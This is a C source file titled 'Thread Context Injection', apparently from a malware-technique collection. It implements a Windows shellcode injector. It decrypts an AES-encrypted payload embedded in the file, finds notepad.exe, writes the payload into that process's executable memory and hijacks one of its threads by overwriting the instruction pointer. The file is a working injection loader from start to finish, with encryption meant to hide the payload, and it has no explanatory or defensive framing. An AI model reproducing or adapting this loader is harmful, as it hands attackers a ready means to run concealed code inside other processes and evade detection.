# Thread Context Injection

```c
#include <winternl.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")

// MessageBox shellcode - 64-bit
unsigned char payload[] = { 0xe6, 0x3d, 0xf5, 0xe1, 0x42, 0x9d, 0x4d, 0xfd, 0x68, 0x74, 0xb1, 0xe4, 0xd7, 0x39, 0x17, 0x11, 0xd2, 0x18, 0x7c, 0x8b, 0xf2, 0xc5, 0xf9, 0x37, 0xc3, 0xc1, 0x90, 0x15, 0xdc, 0x51, 0x24, 0xcb, 0xa9, 0xa0, 0xde, 0x3b, 0xbf, 0x3f, 0x6c, 0x1e, 0x14, 0x26, 0x0f, 0x46, 0x78, 0xfa, 0xba, 0x8a, 0xdc, 0xe3, 0x9f, 0x34, 0x4e, 0x59, 0xe0, 0xd8, 0x94, 0xe1, 0x28, 0xfa, 0xed, 0x80, 0xf4, 0x90, 0xed, 0xa7, 0x55, 0x65, 0x3e, 0x42, 0xe8, 0x2b, 0x1a, 0x51, 0xb2, 0x11, 0x62, 0xf6, 0x51, 0x45, 0xd4, 0xf0, 0xfb, 0xc5, 0xe5, 0xd4, 0x9f, 0x6f, 0x48, 0xd9, 0xc2, 0xb8, 0x4b, 0xb0, 0x89, 0x03, 0x0f, 0xf4, 0xb7, 0x9a, 0xbb, 0x26, 0xd3, 0x3a, 0xcc, 0xc6, 0x29, 0x06, 0x93, 0x08, 0xc7, 0x23, 0xf3, 0x04, 0xf6, 0xd9, 0x63, 0x76, 0x93, 0x19, 0x6d, 0xdf, 0xef, 0x03, 0xd9, 0x84, 0x3f, 0x7d, 0xe6, 0xda, 0x6f, 0xc5, 0x45, 0xd3, 0xd8, 0xc5, 0xeb, 0x89, 0x04, 0x1f, 0x53, 0x11, 0x7b, 0x4e, 0x10, 0x7b, 0x1b, 0xe7, 0xa6, 0xd1, 0x59, 0x3f, 0x12, 0xc2, 0xce, 0xbe, 0xea, 0x29, 0x4a, 0xff, 0xf8, 0x72, 0x12, 0xb0, 0xc1, 0x57, 0xac, 0x3a, 0xee, 0x75, 0x85, 0xfc, 0x02, 0x25, 0x17, 0x14, 0xf6, 0x9c, 0xf6, 0x15, 0x66, 0x3e, 0x93, 0x54, 0xe5, 0x39, 0xec, 0xeb, 0x9d, 0x7e, 0xd8, 0x90, 0x07, 0x36, 0x4d, 0x5f, 0x01, 0xa7, 0x9e, 0xfc, 0x0b, 0x15, 0x0c, 0xf2, 0xa6, 0x4f, 0xfc, 0x90, 0x88, 0xd5, 0x54, 0xd0, 0xf4, 0xda, 0x7a, 0xf5, 0x44, 0x21, 0xa1, 0x4f, 0x9a, 0xc0, 0xe6, 0xa3, 0x57, 0x26, 0x6c, 0xa9, 0x3f, 0x23, 0xfb, 0x15, 0xde, 0x36, 0x69, 0x5b, 0x45, 0x40, 0xff, 0x76, 0xd6, 0x70, 0x66, 0x3b, 0x4c, 0x74, 0xdd, 0x2b, 0x89, 0x02, 0xab, 0x84, 0xaa, 0x10, 0xd7, 0x50, 0x78, 0x3f, 0xc3, 0x34, 0x3d, 0xea, 0x54, 0x74, 0xc5, 0xfc, 0xb2, 0xa0, 0x85, 0xc3, 0xdf, 0x2d, 0xdf, 0x57, 0x69, 0xd5, 0xe7, 0xd9, 0x34, 0xf9, 0xe4, 0x46, 0x8e, 0x70, 0x77, 0x31, 0x7b, 0x9e, 0x4b, 0xfb, 0x1a, 0xae, 0x5f, 0x65, 0x39, 0xe6, 0xe2, 0xac, 0x26, 0x36, 0x92, 0xe4, 0x69, 0xc5 };
unsigned char key[] = { 0xa1, 0x48, 0xfe, 0x30, 0xbd, 0x36, 0xb8, 0x1c, 0x6a, 0x10, 0x26, 0x27, 0x56, 0xd4, 0xb5, 0xaf };
unsigned int payload_len = sizeof(payload);

typedef struct _CLIENT_ID {
	HANDLE UniqueProcess;
	HANDLE UniqueThread;
} CLIENT_ID, * PCLIENT_ID;

typedef LPVOID(WINAPI* VirtualAlloc_t)(
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD  flAllocationType,
	DWORD  flProtect);

typedef VOID(WINAPI* RtlMoveMemory_t)(
	VOID UNALIGNED* Destination,
	const VOID UNALIGNED* Source,
	SIZE_T Length);

typedef FARPROC(WINAPI* RtlCreateUserThread_t)(
	IN HANDLE ProcessHandle,
	IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL,
	IN BOOLEAN CreateSuspended,
	IN ULONG StackZeroBits,
	IN OUT PULONG StackReserved,
	IN OUT PULONG StackCommit,
	IN PVOID StartAddress,
	IN PVOID StartParameter OPTIONAL,
	OUT PHANDLE ThreadHandle,
	OUT PCLIENT_ID ClientId);

typedef NTSTATUS(NTAPI* NtCreateThreadEx_t)(
	OUT PHANDLE hThread,
	IN ACCESS_MASK DesiredAccess,
	IN PVOID ObjectAttributes,
	IN HANDLE ProcessHandle,
	IN PVOID lpStartAddress,
	IN PVOID lpParameter,
	IN ULONG Flags,
	IN SIZE_T StackZeroBits,
	IN SIZE_T SizeOfStackCommit,
	IN SIZE_T SizeOfStackReserve,
	OUT PVOID lpBytesBuffer);


int AESDecrypt(char* payload, unsigned int payload_len, char* key, size_t keylen) {
	HCRYPTPROV hProv;
	HCRYPTHASH hHash;
	HCRYPTKEY hKey;

	if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
		return -1;
	}
	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
		return -1;
	}
	if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)) {
		return -1;
	}
	if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
		return -1;
	}

	if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)payload, (DWORD*)&payload_len)) {
		return -1;
	}

	CryptReleaseContext(hProv, 0);
	CryptDestroyHash(hHash);
	CryptDestroyKey(hKey);

	return 0;
}


int FindTarget(const wchar_t* procname) {

	HANDLE hProcSnap;
	PROCESSENTRY32 pe32;
	int pid = 0;
	wchar_t procnameLower[260];
	wchar_t exeNameLower[260];


	wcsncpy_s(procnameLower, 260, procname, _TRUNCATE);
	for (size_t i = 0; procnameLower[i]; i++) {
		procnameLower[i] = towlower(procnameLower[i]);
	}

	hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (INVALID_HANDLE_VALUE == hProcSnap) return 0;

	pe32.dwSize = sizeof(PROCESSENTRY32);

	if (!Process32First(hProcSnap, &pe32)) {
		CloseHandle(hProcSnap);
		return 0;
	}

	while (Process32Next(hProcSnap, &pe32)) {
		wcsncpy_s(exeNameLower, 260, pe32.szExeFile, _TRUNCATE);
		for (size_t i = 0; exeNameLower[i]; i++) {
			exeNameLower[i] = towlower(exeNameLower[i]);
		}

		if (wcscmp(procnameLower, exeNameLower) == 0) {
			pid = pe32.th32ProcessID;
			break;
		}
	}

	CloseHandle(hProcSnap);

	return pid;
}


HANDLE FindThread(int pid) {

	HANDLE hThread = NULL;
	THREADENTRY32 thEntry;

	thEntry.dwSize = sizeof(thEntry);
	HANDLE Snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);

	while (Thread32Next(Snap, &thEntry)) {
		if (thEntry.th32OwnerProcessID == pid) {
			hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, thEntry.th32ThreadID);
			break;
		}
	}
	CloseHandle(Snap);

	return hThread;
}



// set remote process/thread context
int InjectCTX(int pid, HANDLE hProc, unsigned char* payload, unsigned int payload_len) {

	HANDLE hThread = NULL;
	LPVOID pRemoteCode = NULL;
	CONTEXT ctx;

	// find a thread in target process
	hThread = FindThread(pid);
	if (hThread == NULL) {
		printf("Error, hijack unsuccessful.\n");
		return -1;
	}

	// Decrypt payload
	AESDecrypt((char*)payload, payload_len, (char*)key, sizeof(key));

	// perform payload injection
	pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
	WriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T*)NULL);

	// execute the payload by hijacking a thread in target process
	SuspendThread(hThread);
	ctx.ContextFlags = CONTEXT_FULL;
	GetThreadContext(hThread, &ctx);
#ifdef _M_IX86 
	ctx.Eip = (DWORD_PTR)pRemoteCode;
#else
	ctx.Rip = (DWORD_PTR)pRemoteCode;
#endif
	SetThreadContext(hThread, &ctx);

	return ResumeThread(hThread);
}


int main(void) {

	int pid = 0;
	HANDLE hProc = NULL;

	pid = FindTarget(L"notepad.exe");

	if (pid) {
		printf("Notepad.exe PID = %d\n", pid);

		// try to open target process
		hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
			PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
			FALSE, (DWORD)pid);

		if (hProc != NULL) {
			InjectCTX(pid, hProc, payload, payload_len);
			CloseHandle(hProc);
		}
	}
	return 0;
}

```
